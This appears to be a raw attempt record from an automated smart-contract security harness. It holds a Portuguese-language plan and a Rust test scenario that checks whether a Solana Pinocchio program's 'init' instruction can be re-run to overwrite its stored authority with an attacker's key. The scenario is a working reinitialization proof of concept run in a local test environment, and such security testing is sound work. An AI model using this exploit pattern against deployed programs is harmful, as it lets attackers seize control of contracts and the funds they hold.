attempts.raw:
{"plan": "O programa `init` (Pinocchio) le a flag de inicializacao em data[40] sem verificar o owner da conta. Monto uma conta `config` com owner arbitrario (nao o program_id) e byte 40 zerado, e uma conta `authority`. O baseline chama a instrucao `init` legitimamente sobre essa conta, que deve ter sucesso e gravar a flag em data[40]=1. O ataque reexecuta `init` sobre a mesma conta ja inicializada (estado vindo do baseline), tentando sobrescrever a autoridade/saldo; se o programa nao checar owner, a reinit passa e o efeito mede que data[40] continua 1 e a autoridade foi sobrescrita por uma nova chave.", "scenario": "let config_key = Pubkey::new_unique();
let authority_key = Pubkey::new_unique();
let attacker_authority = Pubkey::new_unique();

// Conta controlada pelo atacante: owner arbitrario, byte 40 zerado, 49 bytes
let mut config_data = vec![0u8; 49];
config_data[40] = 0;
let config = account(&Pubkey::new_unique(), &config_data, None);

let authority = wallet(1_000_000_000);

let metas = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority_key, false),
];
let ix = env.raw_ix(&[1u8], metas);

let contas = vec![
    (config_key, config.clone()),
    (authority_key, authority.clone()),
];

let r = env.baseline("init legitimo", &ix, &contas);

if r.program_result == ProgramResult::Success {
    let config_pos = after(&r, &config_key).clone();
    let authority_pos = after(&r, &authority_key).clone();

    // Ataque: reexecuta init sobre a conta ja inicializada, com nova authority
    let metas_ataque = vec![
        AccountMeta::new(config_key, true),
        AccountMeta::new_readonly(attacker_authority, false),
    ];
    let ix_ataque = env.raw_ix(&[1u8], metas_ataque);

    let contas_ataque = vec![
        (config_key, config_pos.clone()),
        (attacker_authority, wallet(1_000_000_000)),
    ];

    let a = env.attack("reinit sobrescreve authority", &ix_ataque, &contas_ataque);

    if a.program_result == ProgramResult::Success {
        let config_depois = after(&a, &config_key);
        let authority_gravada = read_pubkey(config_depois.data(), 8);
        env.effect(
            "authority sobrescrita pela chave do atacante",
            authority_gravada == attacker_authority,
        );
        env.effect(
            "flag de inicializacao permanece 1",
            config_depois.data()[40] == 1,
        );
    }
}"}

